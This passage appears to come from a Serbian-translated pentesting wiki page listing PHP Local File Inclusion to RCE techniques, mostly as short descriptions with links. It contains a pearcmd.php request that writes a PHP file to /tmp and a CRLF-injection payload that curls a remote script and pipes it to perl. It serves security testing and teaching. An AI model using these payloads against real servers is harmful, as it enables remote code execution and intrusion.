Ako ste pronašli **Local File Inclusion**, čak i ako **nemate session** i `session.auto_start` je `Off`. Ako u multipart POST podacima pošaljete vrednost za **`PHP_SESSION_UPLOAD_PROGRESS`**, PHP će **omogućiti session za vas**. Ovo možete zloupotrebiti da dobijete RCE:


{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Putem temp file uploads in Windows

Ako ste pronašli **Local File Inclusion** i server radi na **Windows**, možda možete dobiti RCE:


{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Putem `pearcmd.php` + URL args

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), skripta `/usr/local/lib/phppearcmd.php` postoji po defaultu u php docker images. Štaviše, moguće je proslediti argumente skripti preko URL-a zato što je naznačeno da ako URL param nema `=`, treba ga koristiti kao argument. Pogledajte takođe [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) i [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

The following request create a file in `/tmp/hello.php` with the content `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
Sledeće zloupotrebljava CRLF vuln da bi dobilo RCE (preuzeto sa [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Kroz phpinfo() (file_uploads = on)

Ako ste pronašli **Local File Inclusion** i fajl koji otkriva **phpinfo()** sa file_uploads = on, možete dobiti RCE:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### Kroz compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

Ako ste pronašli **Local File Inclusion** i možete **exfiltrate the path** privremenog fajla, ALI **server** proverava da li **fajl koji se uključuje ima PHP marks**, možete pokušati da **zaobiđete tu proveru** pomoću ove **Race Condition**:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### Kroz eternal waiting + bruteforce

Ako možete zloupotrebiti LFI da **upload temporary files** i naterate server da **hang** PHP izvršavanje, možete potom **brute force filenames during hours** da biste pronašli privremeni fajl:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### Do fatalne greške

Ako uključite bilo koji od fajlova `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Potrebno je uključiti isti fajl 2 puta da biste izazvali tu grešku).

**Ne znam kako je ovo korisno, ali možda jeste.**\
_Čak i ako izazovete PHP Fatal Error, PHP privremeni fajlovi koji su uploadovani se brišu._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>


## References

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
